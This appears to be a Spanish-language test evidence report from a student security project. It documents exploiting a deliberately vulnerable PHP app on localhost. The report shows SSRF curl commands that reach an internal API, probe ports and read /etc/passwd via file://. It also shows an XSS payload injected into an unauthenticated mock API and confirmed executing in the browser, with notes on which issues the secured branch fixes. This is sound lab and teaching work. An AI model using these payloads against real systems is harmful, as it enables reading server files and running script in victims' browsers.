# Fase 4 — Pruebas de Vulnerabilidades (Reporte de Evidencia)

> **Responsable:** Juan Sebastián Zamora
> **Rama probada:** `versión-vulnerable`
> **Uso exclusivo en entorno controlado y aislado.**

## Propósito

Este documento **no** es un guion de demo (para eso están
[demo_ssrf.md](demo_ssrf.md) y [demo_xss_api.md](demo_xss_api.md)). Es el
**registro de las pruebas ejecutadas** que confirman que las vulnerabilidades
planificadas son explotables, con las salidas reales obtenidas. Cubre los
puntos 4.1 a 4.4 de [plan_app_vulnerable.md](plan_app_vulnerable.md).

## Entorno de prueba

| Componente | Valor usado en esta prueba | Nota |
|---|---|---|
| SO anfitrión | macOS | Prueba local previa al despliegue en VMs |
| API mock | `python3 api/api_mock.py 5001` | Se usó **puerto 5001** porque en macOS el 5000 lo ocupa AirPlay Receiver. En el despliegue real de VMs (Ubuntu) se mantiene el **5000** del [despliegue_vms.md](despliegue_vms.md). |
| App PHP | `php -S 0.0.0.0:8080 router.php` | PHP 8.5 (Homebrew) |

> **Aviso para el equipo:** para probar en local hubo que cambiar
> `ver_portafolio.php` de `localhost:5000` a `localhost:5001`. Ese cambio es
> **solo local y se revierte**; la rama sigue apuntando al 5000. Si alguien
> reproduce esto en macOS, debe hacer el mismo ajuste temporal.

---

## Resumen de resultados

| # | Prueba | Vulnerabilidad | Resultado |
|---|---|---|---|
| 4.1 | SSRF: server como proxy hacia API interna | API7:2023 / CWE-918 | ✅ Explotable |
| 4.2 | SSRF: sondeo de puertos internos y `file://` | API7:2023 / CWE-918 | ✅ Explotable (incluye lectura de `/etc/passwd`) |
| 4.3 | Comprometer API mock (sin auth) | API10:2023 / CWE-20 | ✅ Explotable |
| 4.4 | XSS ejecutado en el navegador | CWE-79 (consecuencia de API10) | ✅ Confirmado en DOM |

---

## Baseline (comportamiento normal)

Antes de atacar, se confirma que la app funciona bien con una URL legítima:

```bash
curl -s http://localhost:8080/backend/ver_portafolio.php
```

Devuelve los 2 repositorios legítimos del mock (`proyecto-ejemplo`,
`api-client`). Todo normal.

---

## 4.1 — SSRF: el servidor como proxy hacia un servicio interno

**Comando:**

```bash
curl -s -X POST http://localhost:8080/backend/crear_perfil.php \
  -F "nombre=Atacante" \
  -F "url_repositorio=http://localhost:5001/repos"
```

**Salida real (recortada):**

```json
{
  "status": "perfil_creado",
  "url_solicitada": "http://localhost:5001/repos",
  "estado_conexion": "ok",
  "estado_http_externo": "HTTP/1.0 200 OK",
  "preview_repositorio": "[{\"nombre\": \"proyecto-ejemplo\", \"descripcion\": ..."
}
```

**Qué demuestra:** el atacante puso una URL **interna** en el campo pensado
para un repo público, y el servidor la consultó por él y le devolvió el
contenido en `preview_repositorio`. El servidor actúa como proxy hacia servicios
que el atacante no podría alcanzar directamente desde afuera. (CWE-918)

---

## 4.2 — SSRF: sondeo de red interna y lectura de archivos

**4.2a — Puerto interno cerrado (`127.0.0.1:22`):**

```bash
curl -s -X POST http://localhost:8080/backend/crear_perfil.php \
  -F "nombre=Atacante" -F "url_repositorio=http://127.0.0.1:22"
```

```json
{ "estado_conexion": "error_conexion", "estado_http_externo": null, "preview_repositorio": null }
```

Comparado con 4.1 (`estado_conexion: "ok"`), la respuesta **cambia según el
puerto esté abierto o cerrado**. Esa diferencia convierte al endpoint en un
oráculo para **mapear la red interna** (escaneo de puertos a ciegas).

**4.2c — Lectura de archivo local vía `file://`:**

```bash
curl -s -X POST http://localhost:8080/backend/crear_perfil.php \
  -F "nombre=Atacante" -F "url_repositorio=file:///etc/passwd"
```

**Salida real (recortada):**

```json
{
  "estado_conexion": "ok",
  "preview_repositorio": "##\n# User Database\n# ...\nnobody:*:-2:-2:...\nroot:*:0:0:System Administrator:/var/root:/bin/sh\n..."
}
```

**Qué demuestra:** `file_get_contents()` acepta el esquema `file://`, así que
el atacante **exfiltra archivos del sistema de archivos del servidor**. Este es
el impacto más grave del SSRF de este proyecto.

> Nota técnica: apuntar el SSRF al propio `127.0.0.1:8080` da `error_conexion`
> porque el servidor de desarrollo de PHP es de un solo hilo y se bloquea
> consigo mismo — es un artefacto del entorno de prueba, no un caso a documentar
> como "puerto abierto". El par abierto/cerrado ya queda demostrado con 4.1 vs 4.2a.

---

## 4.3 — Comprometer la API mock (Consumo No Seguro de APIs)

**Comando (inyectar payload en la "API de terceros"):**

```bash
curl -s -X POST http://localhost:5001/update_repos \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"repo-malicioso","descripcion":"<script>alert(\"XSS - Grupo 6\")</script>","url":"https://evil.com","lenguaje":"JavaScript"}]'
```

**Salida real:**

```json
{"status": "repositorios actualizados", "repos": [{"nombre": "repo-malicioso", "descripcion": "<script>alert(\"XSS - Grupo 6\")</script>", ...}]}
```

**Qué demuestra:** el endpoint `/update_repos` **no pide autenticación ni valida
la estructura**. Cualquiera puede reemplazar los datos que la API entrega. Esto
simula una API de terceros comprometida (API10:2023 / CWE-20).

**Propagación sin sanitizar (backend confía ciegamente):**

```bash
curl -s http://localhost:8080/backend/ver_portafolio.php
```

Confirmado que la descripción llega al cliente **cruda**:

```
descripcion recibida: '<script>alert("XSS - Grupo 6")</script>'
--> contiene <script> sin escapar
```

`ver_portafolio.php` consulta la API, decodifica el JSON y lo reenvía tal cual,
sin validar ni escapar nada.

---

## 4.4 — XSS ejecutado en el navegador de la víctima

Un `<script>` insertado vía `innerHTML` no se auto-ejecuta, así que para la
prueba end-to-end se usó el payload con `onerror` (previsto en
[payloads.txt](payloads.txt) §2.2), que sí dispara:

```bash
curl -s -X POST http://localhost:5001/update_repos \
  -H "Content-Type: application/json" \
  -d '[{"nombre":"repo-malicioso","descripcion":"<img src=x onerror=\"window.__xss_fired=true;document.title=String.fromCharCode(88,83,83)\">","url":"https://evil.com","lenguaje":"JS"}]'
```

**Procedimiento:** se abrió `http://localhost:8080/` en el navegador y se pulsó
**"Cargar Portafolio"**.

**Evidencia de ejecución (verificada en la consola del navegador):**

```json
{ "xss_fired": true, "page_title": "XSS" }
```

Y el DOM resultante mostró el payload inyectado dentro de la tarjeta del repo:

```html
<div class="repo-card">
  <h3>repo-malicioso</h3>
  <p><img src="x" onerror="window.__xss_fired=true;document.title=String.fromCharCode(88,83,83)"></p>
  ...
</div>
```

**Qué demuestra:** el JavaScript del atacante **se ejecutó en el navegador de la
víctima** — cambió el título de la pestaña a "XSS" y activó la bandera
`window.__xss_fired`. La cadena completa quedó probada:

```
API mock comprometida (4.3) -> backend reenvía sin sanitizar (4.3) -> frontend
usa innerHTML sin escape -> el navegador ejecuta el código (4.4)
```

Código vulnerable: `frontend/script.js` (renderizado con `innerHTML` del campo
`descripcion`).

> Para el **video de defensa** conviene usar el payload con `alert()` visible
> (payloads.txt §2.1), que muestra el popup en pantalla — es más claro para
> grabar. Aquí se usó la variante con bandera para poder verificar la ejecución
> de forma objetiva y automatizable.

---

## Estado de las mitigaciones (para coordinar con Blue Team)

Al reproducir estas mismas pruebas contra la rama `versión-asegurada`:

- **SSRF (4.1, 4.2):** mitigado — `crear_perfil.php` valida el esquema y una
  allowlist de dominios, y bloquea IPs privadas/reservadas.
- **API sin auth / consumo inseguro (4.3):** parcialmente abordado en el backend.
- **XSS (4.4):** ⚠️ **pendiente** — `frontend/script.js` sigue usando `innerHTML`
  sin escape en la rama asegurada (idéntico a la vulnerable). Si la rúbrica exige
  las 3 vulnerabilidades mitigadas en la versión segura, **falta aplicar
  `textContent`/DOMPurify en el front**. Avisar a Oscar/Claudia (Blue Team).

## Reset tras las pruebas

```bash
# Reiniciar el mock para restaurar los repos originales
# (Ctrl+C en api_mock.py y volver a arrancarlo)
# Vaciar los perfiles de prueba:
> data/usuarios.txt
```
